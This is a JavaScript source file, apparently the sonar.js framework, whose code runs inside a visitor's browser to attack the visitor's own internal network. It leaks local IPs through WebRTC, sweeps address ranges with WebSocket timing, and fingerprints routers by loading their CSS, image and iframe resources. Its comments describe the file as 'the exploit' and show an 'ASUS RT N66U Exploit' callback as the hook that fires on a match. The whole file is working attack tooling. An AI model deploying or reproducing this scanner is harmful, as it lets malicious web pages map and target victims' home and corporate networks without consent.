var sonar = {
    'debug': false,
    'fingerprints': [],
    'scans': {},
    'websocket_timeout': 5000,
    'ip_queue': [], // Queue of IPs to scan

    /*
     * Start the exploit
     */
    'start': function(debug, interval_scan, target) {
        if( debug !== undefined ) {
          sonar.debug = true;
        }

        if( interval_scan === undefined ) {
            interval_scan = 1000;
        }

        if( target === undefined ) {
            target = "/24";
        }

        if( sonar.fingerprints.length == 0 ) {
            return false;
        }

        // Separate IP and range, target[0] is the IP and target[1] is the range
        target = target.split( '/' );

        // This calls sonar.process_queue() every 
        setInterval( function() {
            sonar.process_queue();
        }, interval_scan );

        if( target[0] == "" ) {
            sonar.enumerate_local_ips( target[1] );
        } else{
			sonar.ip_to_range( target[0], target[1] );
        }
    },

    /*
     * Continually check if there are more IPs to be scanned and empty the queue as it fills
     */
    'process_queue': function() {
        for(  i = 0; i < 5; i++ ) {
            if( sonar.ip_queue.length > 0 ) {
                var tmp_ip = sonar.ip_queue.shift();
                sonar.check_ip( tmp_ip );
            }
        }
    },

    /*
     * Kicks off enumeration of devices (generating a unique id to keep track of the onload chain)
     */
    'identify_device': function( ip ) {
        var resource_list = [];
        sonar.fingerprints.forEach( function( fingerprint, index, all ) {
            if( fingerprint.resources.length > 0 ) {
                var random_id = sonar.generate_random_id();
                sonar.scans[ random_id ] = {
                    'offset': 0,
                    'name': fingerprint.name,
                    'resources': fingerprint.resources,
                    'callback': fingerprint.callback,
                };
                sonar.check_resource_exists( sonar.scans[ random_id ].resources[0], ip, random_id );
            }
        });
    },

    /*
     * This function keeps the records for what resources have been mapped to which hosts.
     */
    'internal_host_manager': function( ip, resource, id, otherProps, error ) {
        if( error ) {
            delete sonar.scans[ id ];
            return;
        }

        // If it's an image, check the dimensions
        if ( resource instanceof Array && otherProps.hasOwnProperty('width') ) {
            if (resource[1] != otherProps.width || resource[2] != otherProps.height) {
                delete sonar.scans[ id ];
                return;
            }
        }

        // If it's the last element then call it's callback.
        if( sonar.scans[ id ].resources[ sonar.scans[ id ].resources.length - 1 ] == resource ) {
            if( sonar.debug ) {
                alert( '[DEBUG][' + id + '] Found "' + sonar.scans[ id ].name + '" at ' + ip );
            }
            sonar.scans[ id ].callback( ip );
            delete sonar.scans[ id ];
            return;
        } else {
            sonar.scans[ id ].offset++;
            sonar.check_resource_exists( sonar.scans[ id ].resources[ sonar.scans[ id ].offset ], ip, id );
        }
    },

    /*
     * Browser fingerprints are loaded here
     *
     * Fingerprints are just arrays of resources such as images, css, and javascript that can be enumerated via external resource onload.
     * By checking for the existance of these resources we can identify routers and other internal devices and launch appropriate exploits.
     *
     * Example fingerprint data structure:
     * var fingerprints = [
     *  {
     *      'name': 'ASUS RT N66U Exploit',
     *      'resources': [ '/other.css' ],
     *      'callback': function( ip ),
     *  }
     * ]
     *
     */
    'load_fingerprints': function( fingerprints ) {
        sonar.fingerprints = fingerprints;
    },

    'ip_to_range': function(ip, range) {
        var ip_parts = ip.split( '.' );
        if( ip_parts.length !== 4 ) {
            return false;
        }

        var ip_min = [0, 0, 0, 0];
        var ip_max = [0, 0, 0, 0];
        var r = 0;

        for( var tmp = 0; tmp < 4; tmp++ ) {

			// Calculate the number of bits that change of each part
			if ( range > 8 + 8 * tmp){
				r = 0;
			} else {
				r = 8 - (range - tmp * 8);
				if ( r < 0 ){
					r = 8;
				}
			}

            // Calculate minimum and maximum of IP range for the current part
            ip_min[tmp] = ip_parts[tmp] & (255 << r);
            ip_max[tmp] = ip_parts[tmp] | (255 & ~(255 << r));
        }

        if( sonar.debug ) {
            alert( '[DEBUG][The samallest IP adress to be scaned is:]' + ip_min[0] + '.' + ip_min[1] + '.' + ip_min[2] + '.' + ip_min[3]);
            alert( '[DEBUG][The largest IP adress to be scaned is:]' + ip_max[0] + '.' + ip_max[1] + '.' + ip_max[2] + '.' + ip_max[3]);
        }

        // Queue IP address range
        var ip_parts = ip_min.slice();
        for( var a = ip_min[0]; a <= ip_max[0]; a++ ) {
			ip_parts[0] = a;
			for( var b = ip_min[1]; b <= ip_max[1]; b++ ) {
				ip_parts[1] = b;
				for( var c = ip_min[2]; c <= ip_max[2]; c++ ) {
					ip_parts[2] = c;
					for( var d = ip_min[3]; d <= ip_max[3]; d++ ) {
						ip_parts[3] = d;
						var tmp_ip = ip_parts[0] + '.' + ip_parts[1] + '.' + ip_parts[2] + '.' + ip_parts[3];
						sonar.ip_queue.push( tmp_ip );
					}
				}
			}
		}
    },

    /*
    *   Credit to lan-scan code found here: http://algorithm.dk/lanscan, WebSockets prove to be a fast way to enumerate live hosts!
    */
    'check_ip': function ( ip ){
        var done = false;
        var t1 = +new Date();
        var socket = new WebSocket("ws://" + ip + '/' + sonar.generate_random_id() );
        socket.onerror = function(e){
            if(e.timeStamp - t1 < 10){
                done = true;
                socket.close();
                setTimeout(function(){
                    sonar.check_ip( ip );
                }, sonar.websocket_timeout);
            }
            if(!done){
                done = true;
                socket.close();
                socket = null;
                sonar.identify_device(ip);
            }
        };
        socket.onclose = function(){
            if(!done){
                done = true;
                socket.close();
                socket = null;
                sonar.dead_ip(ip);
            }
        }
        socket.onopen = function(){
            if(!done){
                done = true;
                socket.close();
                socket = null;
                sonar.identify_device( ip );
            }
        }
        setTimeout(function(){
            if(!done){
                done = true;
                socket.close();
                socket = null;
                sonar.dead_ip( ip );
            }
        }, sonar.websocket_timeout);
    },

    'dead_ip': function( ip ) {
        //console.log( 'Dead IP', ip );
    },

    'enumerate_local_ips': function(range) {
        var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
        if (!RTCPeerConnection) return false;
        var addrs = Object.create(null);
        addrs['0.0.0.0'] = false;
        function addAddress(newAddr) {
            if (newAddr in addrs) return;
            addrs[newAddr] = true;
            sonar.ip_to_range(newAddr, range);
        }
        function grepSDP(sdp) {
            var hosts = [];
            sdp.split('\r\n').forEach(function (line) {
                if (~line.indexOf('a=candidate')) {
                    var parts = line.split(' '),
                        addr = parts[4],
                        type = parts[7];
                    if (type === 'host') addAddress(addr);
                } else if (~line.indexOf('c=')) {
                    var parts = line.split(' '),
                        addr = parts[2];
                    addAddress(addr);
                }
            });
        }
        var rtc = new RTCPeerConnection({iceServers:[]});
        rtc.createDataChannel('', {reliable:false});
        rtc.onicecandidate = function (evt) {
            if (evt.candidate) grepSDP('a='+evt.candidate.candidate);
        };
        setTimeout(function() {
            rtc.createOffer(function (offerDesc) {
                grepSDP(offerDesc.sdp);
                rtc.setLocalDescription(offerDesc);
            }, function (e) {});
        }, 500);
        return true;
    },

    'generate_random_id': function() {
        function s4() {
            return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
        }
        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
        s4() + '-' + s4() + s4() + s4();
    },

    /*
     * Internal host fingerprinting via hooking onload and onerror. Even active content such as HTML pages and .js can be used here (as they are read via static iframes)
     */
    'check_resource_exists': function( resource, ip, id ) {
        var full_source = 'http://' + ip + ( resource instanceof Array ? resource[0] : resource );
        var element_id = sonar.generate_random_id();
        if( full_source.toLowerCase().endsWith( '.css' ) ) {
            var resourceref = document.createElement( "link" );
            resourceref.setAttribute( "id", element_id );
            resourceref.setAttribute( "type", "text/css" );
            resourceref.setAttribute( "rel", "stylesheet" );
            resourceref.setAttribute( "href", full_source );
        } else if ( full_source.toLowerCase().endsWith( '.png' ) || full_source.toLowerCase().endsWith( '.gif') || full_source.toLowerCase().endsWith( '.jpg' ) || full_source.toLowerCase().endsWith( '.tiff' ) ) {
            var resourceref = document.createElement( "img" );
            resourceref.setAttribute( "id", element_id );
            resourceref.setAttribute( "src", full_source );
        } else {
            var resourceref = document.createElement( "iframe" );
            resourceref.setAttribute( "id", element_id );
            resourceref.setAttribute( "src", full_source );
            resourceref.setAttribute( "sandbox", "" );
        }
        resourceref.addEventListener( "error", function( event ) {
            document.getElementById( element_id ).remove();
            sonar.internal_host_manager( ip, resource, id, null, true );
        }, false );

        resourceref.addEventListener( "load", function( event ) {
            var otherProps = {};
            if (resourceref.nodeName.toLowerCase() == 'img') {
                otherProps.width = resourceref.naturalWidth;
                otherProps.height = resourceref.naturalHeight;
            }
            document.getElementById( element_id ).remove();
            sonar.internal_host_manager( ip, resource, id, otherProps, false );
        }, false );
        document.getElementsByTagName("head")[0].appendChild( resourceref );
    },
}

// Monkey patching JavaScript
Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}

NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
    for(var i = 0, len = this.length; i < len; i++) {
        if(this[i] && this[i].parentElement) {
            this[i].parentElement.removeChild(this[i]);
        }
    }
}

Element.prototype.remove = function() {
    this.parentElement.removeChild(this);
}
